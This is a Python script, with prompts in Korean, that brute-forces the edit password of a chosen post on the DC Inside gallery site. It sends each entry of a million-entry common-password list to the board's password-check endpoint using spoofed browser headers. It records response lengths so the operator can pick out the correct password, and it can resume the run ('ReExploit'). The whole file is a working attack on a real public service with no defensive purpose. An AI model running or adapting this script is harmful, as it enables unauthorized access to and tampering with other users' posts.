import requests
import read_dic
import time

headers = {
	'Accept': '*/*',
	'Accept-Encoding': 'gzip, deflate, br',
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
	'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'Host': 'gall.dcinside.com',
	'Origin': 'https://gall.dcinside.com',
	'Referer': 'https://gall.dcinside.com/board/modify/',
	'X-Requested-With': 'XMLHttpRequest'
}




if __name__ == '__main__':

	id = input('갤러리 아이디 입력[ex) baseball_new10]: ')
	no = input('게시판 번호 입력[ex) 7921643]: ')


	data = []

	dic, count = read_dic.run('10-million-password-list-top-1000000.txt')

	start = int(input('시작 값[0 ~ ' + str(count) + ']: '))


	while True:

		try:

			for i in range(start, count):

					password = dic[i]

					try:
						res = requests.post('https://gall.dcinside.com/board/forms/modify_password_submit', data = "ci_t=23574&password="+password+"&id="+id+"&no="+no+"&_GALLTYPE_=G", headers=headers)

						print( '('+ str(i) + '/' + str(count) + ') ' + res.text + '(' + password + ')' + '(' + str(len(res.text)) + ')')

						data.append( ( i, password, res.text, len(res.text) ) )

					except requests.exceptions.ConnectionError:
						print('requests.exceptions.ConnectionError.')
						time.sleep(5)


		except KeyboardInterrupt:
			print('KeyboardInterrupt.')


		while True:
			print()
			sel = input( '[1] Asc , [2] Desc , [3] ReExploit , [4] Exit : ' )
			
			if sel == '1':
				data.sort(key=lambda x:x[3])

				for i in range( 30 ):
					print( data[i] )

			elif sel == '2':
				data.sort(key=lambda x:x[3], reverse=True)

				for i in range( 30 ):
					print( data[i] )

			elif sel == '3':
				start = int(input('시작 값[0 ~ ' + str(count) + ']: '))
				break

			elif sel == '4':
				exit()